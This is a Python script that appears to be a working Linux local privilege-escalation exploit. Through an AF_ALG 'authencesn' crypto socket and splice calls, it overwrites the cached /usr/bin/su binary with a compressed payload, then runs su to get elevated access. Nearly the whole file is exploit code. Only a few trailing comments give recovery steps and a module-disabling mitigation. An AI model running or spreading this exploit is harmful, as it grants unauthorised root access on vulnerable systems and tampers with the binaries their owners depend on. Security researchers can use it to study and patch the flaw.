import os
import zlib
import socket

# ======================= 修复版 splice 替换 =======================
import ctypes
from ctypes import c_int, c_void_p, c_size_t, c_longlong, c_ssize_t, c_uint

libc = ctypes.CDLL("libc.so.6", use_errno=True)

splice = libc.splice
splice.argtypes = [
    c_int,
    c_void_p,
    c_int,
    c_void_p,
    c_size_t,
    c_uint
]
splice.restype = c_ssize_t

def os_splice(fd_in, fd_out, length, offset_src=None, offset_out=None, flags=0):
    off_in = ctypes.byref(c_longlong(offset_src)) if offset_src is not None else None
    off_out = ctypes.byref(c_longlong(offset_out)) if offset_out is not None else None
    return splice(fd_in, off_in, fd_out, off_out, length, flags)

os.splice = os_splice
# ==================================================================

def d(x):
    return bytes.fromhex(x)

def c(f, t, c):
    a = socket.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    u.sendmsg(
        [b"A" * 4 + c],
        [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)],
        32768
    )
    r, w = os.pipe()
    os_splice(f, w, o, offset_src=0)
    os_splice(r, u.fileno(), o)
    try:
        u.recv(8 + t)
    except:
        pass

f = os.open("/usr/bin/su", 0)
i = 0
e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))

while i < len(e):
    c(f, i, e[i:i+4])
    i += 4

os.system("su")
# sudo apt install --reinstall passwd
# sudo apt reinstall util-linux -y
'''
echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/disable-algif_aead.conf

grep CONFIG_CRYPTO_USER_API_AEAD /boot/config-$(uname -r)

modprobe algif_aead

lsmod | grep algif_aead

rmmod algif_aead 2>/dev/null || true
'''